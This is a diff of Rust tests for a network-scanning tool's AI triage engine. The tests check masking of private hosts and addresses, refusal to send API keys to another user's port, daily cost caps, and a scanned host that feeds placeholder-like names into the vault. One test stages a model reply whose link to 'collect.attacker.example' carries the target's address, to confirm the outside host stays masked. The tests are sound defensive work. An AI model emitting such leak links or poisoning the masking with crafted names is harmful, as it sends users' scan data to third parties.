+            record: EvidenceRecord::observed(Source::NmapXml, Confidence::High, "x"),
+        });
+        script(
+            &mut graph,
+            dc,
+            None,
+            "nbstat",
+            "NetBIOS name: NWFS02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:12:34 (VMware)\n  \
+             Names:\n    NWFS02<00>  Flags: <unique><active>\n    NORTHWIND<00>  Flags: <group><active>\n    \
+             NWFS02<20>  Flags: <unique><active>",
+        );
+        script(
+            &mut graph,
+            dc,
+            Some(445),
+            "smb-enum-shares",
+            "account_used: guest\n  \\\\FILES\\backup:\n    Type: STYPE_DISKTREE\n    \
+             Comment: nightly dumps db_172.16.40.12_full.bak and vpn_198.51.100.77.ovpn",
+        );
+        graph.apply(Observation::Http {
+            address: dc.into(),
+            port: 443,
+            scheme: "https".into(),
+            server: Some("nginx".into()),
+            location: Some(
+                "https://192.0.2.5/oauth/authorize?redirect_uri=http%3A%2F%2F10.20.30.40%2Fcallback"
+                    .into(),
+            ),
+            record: EvidenceRecord::observed(Source::HttpHeader, Confidence::High, "x"),
+        });
+        let host = &graph.hosts[dc];
+        let vault = Mutex::new(Vault::ephemeral());
+        let (masked, _) = mask_prompt(&vault, &graph, host, &triage_prompt(host), false).unwrap();
+        for private in [
+            "northwindtraders",
+            "NWDC01",
+            "NWFS02",
+            "NORTHWIND",
+            "172.16.40.12",
+            "198.51.100.77",
+            "10.20.30.40",
+        ] {
+            assert!(
+                !masked.to_lowercase().contains(&private.to_lowercase()),
+                "{private} went out in: {masked}"
+            );
+        }
+        // What every directory has stays readable.
+        for public in [
+            "CN=NTDS Settings",
+            "CN=Servers",
+            "DC=local",
+            "Default-First-Site-Name",
+        ] {
+            assert!(masked.contains(public), "{public} in {masked}");
+        }
+        let sent: Value = serde_json::from_str(&masked).unwrap();
+        assert!(vault.lock().unwrap().leaks_json(&sent).is_empty());
+    }
+
+    /// A scanned host that names itself like a placeholder (a certificate
+    /// for `host_01`, `Computer name: HOST_02`) or teaches words of every
+    /// banner as user names: later requests still go, and still say what
+    /// software runs. A workspace an earlier version wrote such names into
+    /// recovers.
+    #[tokio::test]
+    async fn names_spelt_like_placeholders_never_stop_later_requests() {
+        if !no_env_key() {
+            return;
+        }
+        let (base, mock) = mock_models().await;
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("state.db");
+        let mut graph = lab();
+        scanned(&mut graph, "203.0.113.66", 443, "https");
+        for n in 1..=8 {
+            graph.apply(Observation::TlsSan {
+                address: "203.0.113.66".into(),
+                port: 443,
+                san: format!("host_{n:02}"),
+                record: EvidenceRecord::observed(Source::TlsSan, Confidence::High, "x"),
+            });
+        }
+        script(
+            &mut graph,
+            "203.0.113.66",
+            None,
+            "smb-os-discovery",
+            "OS: Windows Server 2019\n  Computer name: DOM_01\n  Workgroup: WORKGROUP",
+        );
+        graph.apply(Observation::Fact {
+            address: "203.0.113.66".into(),
+            port: Some(21),
+            protocol: "tcp".into(),
+            claim: "220 Welcome. Login: openssh owner: https account: tcp".into(),
+            record: EvidenceRecord::observed(Source::NmapXml, Confidence::High, "x"),
+        });
+        for session in 0..2 {
+            let db = Arc::new(Mutex::new(Db::open(&path).unwrap()));
+            if session == 1 {
+                // As an earlier version left it: names that are placeholder
+                // text or banner words, stored to be looked for everywhere.
+                for (token, kind, value) in [
+                    ("<<DOM_90>>", "DOM", "host_01"),
+                    ("<<USER_90>>", "USER", "openssh"),
+                    ("<<USER_91>>", "USER", "https"),
+                    ("<<USER_92>>", "USER", "SEC_01"),
+                ] {
+                    db.lock()
+                        .unwrap()
+                        .conn()
+                        .execute(
+                            "INSERT OR IGNORE INTO vault (token, kind, value, exposed, first_seen_utc)
+                             VALUES (?1, ?2, ?3, 0, '2026-11-01T00:00:00Z')",
+                            params![token, kind, value],
+                        )
+                        .unwrap();
+                }
+            }
+            let vault = Mutex::new(Vault::open(Arc::clone(&db)).unwrap());
+            let settings = AiSettings {
+                local_url: format!("{base}/local"),
+                cloud_url: format!("{base}/cloud"),
+                cloud_model: "test/triage".into(),
+                openrouter_api_key: Some("sk-or-test".into()),
+                ..AiSettings::default()
+            };
+            let engine = AiEngine::new(settings, Arc::clone(&db)).unwrap();
+            // The hostile host's own request first, then one about another.
+            let hostile = &graph.hosts["203.0.113.66"];
+            engine
+                .run(Tier::Cloud, &graph, hostile, &vault, &mut |_| {})
+                .await
+                .unwrap();
+            let (outcome, _) = run(&engine, Tier::Cloud, &graph, &vault).await;
+            assert_eq!(outcome.unwrap().tier, Tier::Cloud, "session {session}");
+            // Graph removed the hostile host: still fine.
+            let mut without = graph.clone();
+            without.hosts.remove("203.0.113.66");
+            let (outcome, _) = run(&engine, Tier::Cloud, &without, &vault).await;
+            assert_eq!(outcome.unwrap().tier, Tier::Cloud, "session {session}");
+        }
+        // The model still sees what software the lab host runs.
+        let sent = mock.cloud.lock().unwrap();
+        let (_, last) = sent.last().unwrap();
+        let user = last["messages"][1]["content"].as_str().unwrap();
+        assert!(user.contains("\"service\":\"ssl/http\""), "{user}");
+        assert!(user.contains("cpe:2.3:a:nginx:nginx:1.18.0"), "{user}");
+        // Each was asked once, the rest answered from the prompt cache: the
+        // stored names did not change what is sent.
+        assert_eq!(sent.len(), 2);
+    }
+
+    /// The key and unmasked evidence go only to the user's own server on
+    /// this machine: not to a port another user owns, nor to one whose
+    /// owner cannot be verified (macOS, Windows, `lsof` failing).
+    #[tokio::test]
+    async fn a_port_of_another_user_gets_no_key_and_no_evidence() {
+        if !no_env_key() {
+            return;
+        }
+        let (base, mock) = mock_models().await;
+        for owner in [Some(1001), Some(u32::MAX)] {
+            let _owner = FakePortOwner::set(owner);
+            for carries in [Carries::Key, Carries::Evidence] {
+                let error = format!("{:#}", check_server(&base, carries).unwrap_err());
+                assert!(error.starts_with("refusing to send"), "{error}");
+            }
+            check_server(&base, Carries::Nothing).unwrap();
+            // [C] with a key: refused before anything is sent.
+            let (engine, _db) = engine(&base, Some("sk-or-test"));
+            let graph = lab();
+            let vault = Mutex::new(Vault::ephemeral());
+            let (outcome, _) = run(&engine, Tier::Cloud, &graph, &vault).await;
+            let error = format!("{:#}", outcome.unwrap_err());
+            assert!(error.contains("refusing to send the API key"), "{error}");
+            // [L]: what is sent there is masked.
+            let (outcome, _) = run(&engine, Tier::Local, &graph, &vault).await;
+            assert!(outcome.unwrap().model.contains("(masked: "));
+            let local = mock.local.lock().unwrap().pop().unwrap();
+            assert!(!local.to_string().contains("10.10.10.5"));
+            // A key in the environment is not handed to it either.
+            let loopback = AiSettings {
+                cloud_url: format!("{base}/cloud"),
+                ..AiSettings::default()
+            };
+            assert!(!loopback.env_key_applies());
+            // Nor by `meow setup --check` and the setup screen's test.
+            let error = crate::setup::check_key(&format!("{base}/cloud"), "sk-or-test")
+                .await
+                .unwrap_err();
+            assert!(format!("{error:#}").contains("refusing to send the API key"));
+            let error = crate::setup::list_models(&format!("{base}/cloud"), Some("sk-or-test"))
+                .await
+                .unwrap_err();
+            assert!(format!("{error:#}").contains("refusing to send the API key"));
+        }
+        assert!(mock.cloud.lock().unwrap().is_empty(), "no key was sent");
+        // The user's own server gets both.
+        let _owner = FakePortOwner::set(None);
+        check_server(&base, Carries::Key).unwrap();
+        check_server(&base, Carries::Evidence).unwrap();
+    }
+
+    #[test]
+    fn the_owner_of_a_port_is_this_user_only_when_that_is_seen() {
+        // macOS: `lsof` run by a user lists that user's processes only.
+        assert_eq!(lsof_owner(&[501], 501), None);
+        assert_eq!(lsof_owner(&[501, 0], 501), None);
+        assert_eq!(lsof_owner(&[502], 501), Some(502));
+        assert_eq!(lsof_owner(&[501, 502], 501), Some(502));
+        // Nothing listed, or only a service account: cannot verify.
+        assert_eq!(lsof_owner(&[], 501), Some(u32::MAX));
+        assert_eq!(lsof_owner(&[0], 501), Some(u32::MAX));
+        // An address without a port to look at cannot be verified.
+        assert_eq!(another_users_server("not a url"), Some(u32::MAX));
+        assert!(not_own_server("https://openrouter.ai/api/v1").is_some());
+    }
+
+    /// Where no way to see a port's owner is built in, none is assumed.
+    #[cfg(not(any(target_os = "linux", target_os = "macos")))]
+    #[test]
+    fn elsewhere_a_loopback_port_owner_cannot_be_verified() {
+        assert_eq!(port_owner(1234), Some(u32::MAX));
+        assert!(not_own_server("http://127.0.0.1:1234/v1").is_some());
+        assert!(check_server("http://127.0.0.1:1234/v1", Carries::Key).is_err());
+    }
+
+    /// A stand-in for the Claude API whose research turns all pause, as
+    /// web search turns do, each billing 60,000 tokens in and 16,000 out.
+    async fn pausing_claude() -> (String, Arc<Mutex<Vec<Value>>>) {
+        let seen: Arc<Mutex<Vec<Value>>> = Arc::default();
+        let app = Router::new()
+            .route(
+                "/claude/messages",
+                post(|State(seen): State<Arc<Mutex<Vec<Value>>>>, Json(body): Json<Value>| async move {
+                    seen.lock().unwrap().push(body.clone());
+                    Json(json!({
+                        "model": body["model"],
+                        "stop_reason": "pause_turn",
+                        "content": [{ "type": "text", "text": "searching " }],
+                        "usage": { "input_tokens": 60000, "output_tokens": 16000,
+                                   "server_tool_use": { "web_search_requests": 2 } },
+                    }))
+                }),
+            )
+            .with_state(Arc::clone(&seen));
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let base = format!("http://{}", listener.local_addr().unwrap());
+        tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
+        (base, seen)
+    }
+
+    /// One [R] request resumes paused turns and walks a fallback chain:
+    /// each of those API calls is checked against the daily caps first and
+    /// counted, not the request once.
+    #[tokio::test]
+    async fn every_api_call_counts_against_the_daily_caps() {
+        if std::env::var(anthropic::KEY_ENV).is_ok() {
+            return;
+        }
+        let (base, seen) = pausing_claude().await;
+        let claude = |max_usd: f64, max_calls: u32| AiSettings {
+            local_url: "http://127.0.0.1:1/v1".into(),
+            cloud_url: format!("{base}/claude"),
+            cloud_provider: Some(CloudProvider::Anthropic),
+            research_model: "claude-opus-5-5".into(),
+            openrouter_api_key: Some("sk-ant-test".into()),
+            max_daily_usd: max_usd,
+            max_daily_calls: max_calls,
+            ..AiSettings::default()
+        };
+        let graph = lab();
+        let vault = Mutex::new(Vault::ephemeral());
+        // $1 a day: one turn costs $0.58, so a second does not fit.
+        let engine = AiEngine::new(
+            claude(1.0, 20),
+            Arc::new(Mutex::new(Db::open_in_memory().unwrap())),
+        )
+        .unwrap();
+        let (outcome, _) = run(&engine, Tier::Research, &graph, &vault).await;
+        let error = format!("{:#}", outcome.unwrap_err());
+        assert!(error.contains("daily cloud budget reached"), "{error}");
+        assert_eq!(seen.lock().unwrap().len(), 1);
+        let budget = engine.budget();
+        assert_eq!(budget.calls, 1);
+        assert!((budget.spent_usd - 0.58).abs() < 1e-9, "{budget:?}");
+        assert!(budget.spent_usd <= budget.max_usd);
+        // The next request does not even start.
+        let (outcome, _) = run(&engine, Tier::Research, &graph, &vault).await;
+        assert!(format!("{:#}", outcome.unwrap_err()).contains("daily cloud budget reached"));
+        assert_eq!(seen.lock().unwrap().len(), 1);
+
+        // Plenty of money, three calls a day: the fourth turn is not asked.
+        seen.lock().unwrap().clear();
+        let engine = AiEngine::new(
+            claude(100.0, 3),
+            Arc::new(Mutex::new(Db::open_in_memory().unwrap())),
+        )
+        .unwrap();
+        let (outcome, _) = run(&engine, Tier::Research, &graph, &vault).await;
+        assert!(format!("{:#}", outcome.unwrap_err()).contains("daily cloud budget reached"));
+        assert_eq!(seen.lock().unwrap().len(), 3);
+        assert_eq!(engine.budget().calls, 3);
+
+        // Room for all: four turns of one model are four calls, not one.
+        seen.lock().unwrap().clear();
+        let engine = AiEngine::new(
+            claude(100.0, 20),
+            Arc::new(Mutex::new(Db::open_in_memory().unwrap())),
+        )
+        .unwrap();
+        let (outcome, _) = run(&engine, Tier::Research, &graph, &vault).await;
+        assert_eq!(outcome.unwrap().tier, Tier::Research);
+        assert_eq!(seen.lock().unwrap().len(), 4);
+        let budget = engine.budget();
+        assert_eq!(budget.calls, 4);
+        assert!((budget.spent_usd - 4.0 * 0.58).abs() < 1e-9, "{budget:?}");
+
+        // [C] whose first call would not fit answers locally, as when the
+        // budget is spent.
+        let tight = AiEngine::new(
+            AiSettings {
+                cloud_model: "claude-opus-5-5".into(),
+                ..claude(0.05, 20)
+            },
+            Arc::new(Mutex::new(Db::open_in_memory().unwrap())),
+        )
+        .unwrap();
+        let (outcome, _) = run(&tight, Tier::Cloud, &graph, &vault).await;
+        let error = format!("{:#}", outcome.unwrap_err());
+        assert!(
+            error.starts_with("the cloud was not used: daily cloud budget reached"),
+            "{error}"
+        );
+        assert_eq!(tight.budget().calls, 0);
+    }
+
+    /// An `ai.toml` that is there but cannot be read (a typo, a link, a
+    /// file of another owner) may be the one that chose local-only mode:
+    /// the cloud stays off, and the session says why.
+    #[tokio::test]
+    async fn an_unreadable_setup_file_turns_the_cloud_off() {
+        let (base, mock) = mock_models().await;
+        let dir = tempfile::tempdir().unwrap();
+        let file = dir.path().join("ai.toml");
+        crate::workspace::write_private_atomic(
+            &file,
+            b"disable_cloud = true\nlocal_model = \"llama3\n",
+        )
+        .unwrap();
+        let settings = AiSettings {
+            local_url: format!("{base}/local"),
+            cloud_url: format!("{base}/cloud"),
+            // A key in config.toml, as a key in the environment would be.
+            openrouter_api_key: Some("sk-or-config-key".into()),
+            user_file: Some(file.clone()),
+            ..AiSettings::default()
+        };
+        let effective = settings.effective();
+        assert!(effective.disable_cloud);
+        assert_eq!(effective.api_key(), None);
+        assert_eq!(settings.key_source(), None);
+        let why = effective.setup_error.clone().unwrap();
+        assert!(why.starts_with("ai.toml cannot be read ("), "{why}");
+        assert!(why.ends_with("cloud AI is off until it is fixed"), "{why}");
+        let engine = AiEngine::new(
+            settings,
+            Arc::new(Mutex::new(Db::open_in_memory().unwrap())),
+        )
+        .unwrap();
+        let budget = engine.budget();
+        assert!(!budget.has_key && budget.setup_unreadable);
+        let graph = lab();
+        let vault = Mutex::new(Vault::ephemeral());
+        let (outcome, _) = run(&engine, Tier::Cloud, &graph, &vault).await;
+        let outcome = outcome.unwrap();
+        assert_eq!(outcome.tier, Tier::Local);
+        assert!(outcome
+            .fallback_reason
+            .unwrap()
+            .starts_with("ai.toml cannot be read"));
+        assert!(mock.cloud.lock().unwrap().is_empty());
+        // A link in its place is refused the same way.
+        #[cfg(unix)]
+        {
+            let real = dir.path().join("real.toml");
+            crate::workspace::write_private_atomic(&real, b"cloud_model = \"x\"\n").unwrap();
+            std::fs::remove_file(&file).unwrap();
+            std::os::unix::fs::symlink(&real, &file).unwrap();
+            let linked = AiSettings {
+                openrouter_api_key: Some("sk-or-config-key".into()),
+                user_file: Some(file),
+                ..AiSettings::default()
+            };
+            assert!(linked.effective().setup_error.is_some());
+            assert_eq!(linked.effective().api_key(), None);
+        }
+    }
+
+    /// A key in `config.toml` stays with the service `config.toml` names,
+    /// as one in the environment stays with its own.
+    #[test]
+    fn a_key_in_config_toml_does_not_follow_a_change_of_service() {
+        if !no_env_key() {
+            return;
+        }
+        let dir = tempfile::tempdir().unwrap();
+        let file = dir.path().join("ai.toml");
+        let config = AiSettings {
+            openrouter_api_key: Some("sk-or-config-key".into()),
+            user_file: Some(file.clone()),
+            ..AiSettings::default()
+        };
+        // No setup file: the key goes where config.toml says.
+        assert_eq!(
+            config.effective().api_key().as_deref(),
+            Some("sk-or-config-key")
+        );
+        assert_eq!(config.key_source().as_deref(), Some("config.toml"));
+        // `meow setup --cloud-url` names another service and no key for it.
+        for other in ["https://llm.other.example/v1", "http://127.0.0.1:48125/v1"] {
+            AiOverrides {
+                cloud_url: Some(other.into()),
+                cloud_provider: Some(CloudProvider::OpenAi),
+                ..AiOverrides::default()
+            }
+            .save(&file)
+            .unwrap();
+            assert_eq!(config.effective().api_key(), None, "{other}");
+            assert_eq!(config.key_source(), None, "{other}");
+        }
+        // The Claude API is another service too.
+        AiOverrides {
+            cloud_provider: Some(CloudProvider::Anthropic),
+            cloud_url: Some(anthropic::API_URL.into()),
+            ..AiOverrides::default()
+        }
+        .save(&file)
+        .unwrap();
+        assert_eq!(config.effective().api_key(), None);
+        // A key given for the new service is used for it.
+        AiOverrides {
+            cloud_url: Some("https://llm.other.example/v1".into()),
+            api_key: Some("sk-their-other-key".into()),
+            ..AiOverrides::default()
+        }
+        .save(&file)
+        .unwrap();
+        assert_eq!(
+            config.effective().api_key().as_deref(),
+            Some("sk-their-other-key")
+        );
+        // Settings of the same service keep the key.
+        AiOverrides {
+            cloud_model: Some("other/model".into()),
+            ..AiOverrides::default()
+        }
+        .save(&file)
+        .unwrap();
+        assert_eq!(
+            config.effective().api_key().as_deref(),
+            Some("sk-or-config-key")
+        );
+    }
+
+    /// The reply's link exemption is for the host asked about only: not
+    /// for a third-party host the request also names (a redirect target).
+    #[test]
+    fn only_the_host_asked_about_is_the_users_own_target() {
+        let mut graph = lab();
+        graph.apply(Observation::Http {
+            address: "10.10.10.5".into(),
+            port: 443,
+            scheme: "https".into(),
+            server: None,
+            location: Some("https://collect.attacker.example/".into()),
+            record: EvidenceRecord::observed(Source::HttpHeader, Confidence::High, "x"),
+        });
+        let host = &graph.hosts["10.10.10.5"];
+        let vault = Mutex::new(Vault::ephemeral());
+        let (masked, mut unmasker) =
+            mask_prompt(&vault, &graph, host, &triage_prompt(host), false).unwrap();
+        let token = |value: &str| {
+            let vault = vault.lock().unwrap();
+            let found = vault.placeholders_for_test(value);
+            assert!(masked.contains(&found), "{value} as {found} in {masked}");
+            found
+        };
+        let (own, name, other) = (
+            token("10.10.10.5"),
+            token("portal.corp-acme.com"),
+            token("collect.attacker.example"),
+        );
+        let reply = format!(
+            "Open https://{own}/admin and https://{name}/.\n\
+             See [status](https://{other}/?h={own})\n"
+        );
+        let mut shown = unmasker.push(&reply);
+        shown.push_str(&unmasker.finish());
+        assert_eq!(
+            shown,
+            format!(
+                "Open https://10.10.10.5/admin and https://portal.corp-acme.com/.\n\
+                 See [status](https://{other}/?h={own})\n{}",
+                crate::vault::KEPT_NOTE
+            )
+        );
     }
 }
